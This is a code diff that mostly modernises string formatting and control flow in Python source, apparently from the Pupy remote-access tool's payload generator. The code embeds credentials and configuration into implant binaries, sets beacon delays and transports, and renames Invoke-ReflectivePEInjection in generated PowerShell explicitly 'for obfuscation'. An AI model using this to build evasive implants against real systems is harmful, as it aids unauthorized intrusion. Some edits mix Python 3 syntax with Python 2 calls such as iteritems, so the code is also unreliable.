@@ -55,7 +55,7 @@ class NoOutput(Exception):
     pass
 
 def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
-    logger.debug("generating binary %s with conf: %s"%(path, conf))
+    logger.debug(f"generating binary {path} with conf: {conf}")
 
     binary=b""
     with open(path, 'rb') as f:
@@ -93,8 +93,7 @@ def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
 
     if new_conf_len > HARDCODED_CONF_SIZE:
         raise Exception(
-            'Error: config or offline script too long ({}/{} bytes)'
-            'You need to recompile the dll with a bigger buffer'.format(new_conf_len, HARDCODED_CONF_SIZE)
+            f'Error: config or offline script too long ({new_conf_len}/{HARDCODED_CONF_SIZE} bytes)You need to recompile the dll with a bigger buffer'
         )
 
     new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
@@ -102,7 +101,7 @@ def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     logger.debug('Free space: %d', HARDCODED_CONF_SIZE-new_conf_len)
 
     offset = offsets[0]
-    binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
+    binary = binary[:offset] + new_conf + binary[offset+HARDCODED_CONF_SIZE:]
 
     if binary[:2] == 'MZ':
         pe = pefile.PE(data=binary, fast_load=True)
@@ -115,27 +114,22 @@ def get_raw_conf(display, conf, verbose=False):
 
     credentials = Credentials(role='client')
 
-    if 'offline_script' not in conf:
-        offline_script = ''
-    else:
-        offline_script = conf['offline_script']
-
+    offline_script = '' if 'offline_script' not in conf else conf['offline_script']
     launcher = launchers[conf['launcher']]()
     launcher.parse_args(conf['launcher_args'])
 
     required_credentials = set(launcher.credentials) \
       if hasattr(launcher, 'credentials') else set([])
 
-    transport = launcher.transport
     transports_list = []
 
-    if transport:
+    if transport := launcher.transport:
         transports_list = [transport]
         if transports[transport].credentials:
             for name in transports[transport].credentials:
                 required_credentials.add(name)
 
-    elif not transport:
+    else:
         for n, t in transports.iteritems():
             transports_list.append(n)
 
@@ -175,19 +169,17 @@ def get_raw_conf(display, conf, verbose=False):
 
         display(Table(config_table, ['KEY', 'VALUE'], Color('Configuration', 'yellow'), vspace=1))
 
-    config = {
+    return {
         'credentials': embedded_credentials,
         'scriptlets': [offline_script] or [],
         'debug': conf.get('debug', False),
         'launcher': conf['launcher'],
         'launcher_args': conf['launcher_args'],
         'cid': conf.get('cid', 0x31338),
-        'delays': conf.get('delays', [
-            (10, 5, 10), (50, 30, 50), (-1, 150, 300)
-        ])
+        'delays': conf.get(
+            'delays', [(10, 5, 10), (50, 30, 50), (-1, 150, 300)]
+        ),
     }
-
-    return config
 
 def updateZip(zipname, filename, data):
     # generate a temp file
@@ -336,7 +328,12 @@ def generate_ps1(
             "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
 
     # adding some more obfuscation
-    random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
+    random_name = ''.join(
+        [
+            random.choice(string.ascii_lowercase)
+            for _ in range(0, random.randint(6, 12))
+        ]
+    )
     script      = script.replace('Invoke-ReflectivePEInjection', random_name)
     code        = code.replace('Invoke-ReflectivePEInjection', random_name)
 
@@ -381,26 +378,26 @@ def generate_binary_from_template(display, config, osname, arch=None, shared=Fal
         'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
     }
 
-    TO_PLATFORM = {
-        'x64': 'intel',
-        'x86': 'intel',
-        'armv7l': 'armhf',
-    }
-
-    TO_ARCH = {
-        'intel': {
-            '32bit': 'x86',
-            '64bit': 'x64'
-        },
-        'armhf': {
-            '32bit': 'armhf',
-            '64bit': 'aarch64'
-        }
-    }
-
     arch = arch.lower()
     arch = ARCH_CONVERT.get(arch, arch)
     if bits:
+        TO_PLATFORM = {
+            'x64': 'intel',
+            'x86': 'intel',
+            'armv7l': 'armhf',
+        }
+
+        TO_ARCH = {
+            'intel': {
+                '32bit': 'x86',
+                '64bit': 'x64'
+            },
+            'armhf': {
+                '32bit': 'armhf',
+                '64bit': 'aarch64'
+            }
+        }
+
         arch = TO_ARCH[TO_PLATFORM[arch]]
 
     CLIENTS = {
@@ -419,13 +416,12 @@ def generate_binary_from_template(display, config, osname, arch=None, shared=Fal
     osname = osname.lower()
 
     if osname not in CLIENTS.keys():
-        raise ValueError('Unknown OS ({}), known = {}'.format(
-            osname, ', '.join(CLIENTS.keys())))
+        raise ValueError(f"Unknown OS ({osname}), known = {', '.join(CLIENTS.keys())}")
 
     generator, template, makex = CLIENTS[osname]
 
     if '{arch}' in template and not arch:
-        raise ValueError('arch required for the target OS ({})'.format(osname))
+        raise ValueError(f'arch required for the target OS ({osname})')
 
     shared_ext = 'xxx'
     non_shared_ext = 'xxx'
@@ -452,7 +448,7 @@ def generate_binary_from_template(display, config, osname, arch=None, shared=Fal
         )
 
     if not os.path.isfile(template):
-        raise ValueError('Template not found ({})'.format(template))
+        raise ValueError(f'Template not found ({template})')
 
     if debug:
         config['debug'] = True
@@ -479,32 +475,32 @@ def pack_scriptlets(display, scriptlets, args_scriptlet, os=None, arch=None, deb
                 for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
                     sc_args[x.strip()]=y.strip()
             except:
-                raise ValueError("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
+                raise ValueError(f"usage: pupygen ... -s {name},arg1=value,arg2=value,...")
 
         if name not in scriptlets:
-            raise ValueError("unknown scriptlet %s, valid choices are : %s"%(
-                repr(name), [
-                    x for x in scriptlets.iterkeys()
-                ]))
+            raise ValueError(
+                f"unknown scriptlet {repr(name)}, valid choices are : {list(scriptlets.iterkeys())}"
+            )
 
-        display(Success('loading scriptlet {}{}'.format(
-            repr(name),
-            'with args {}'.format(
-                ' '.join(
-                    '{}={}'.format(k, repr(v)) for k,v in sc_args.iteritems())
-            ) if sc_args else '')))
+        display(
+            Success(
+                f"""loading scriptlet {repr(name)}{f"with args {' '.join(f'{k}={repr(v)}' for k, v in sc_args.iteritems())}" if sc_args else ''}"""
+            )
+        )
 
         try:
             sp.add_scriptlet(scriptlets[name], sc_args)
 
         except ScriptletArgumentError as e:
-            display(MultiPart(
-                Error('Scriptlet {} argument error: {}'.format(repr(name), str(e))),
-                scriptlets[name].format_help()))
-            raise ValueError('{}'.format(e))
+            display(
+                MultiPart(
+                    Error(f'Scriptlet {repr(name)} argument error: {str(e)}'),
+                    scriptlets[name].format_help(),
+                )
+            )
+            raise ValueError(f'{e}')
 
-    script_code = sp.pack()
-    return script_code
+    return sp.pack()
 
 class InvalidOptions(Exception):
     pass
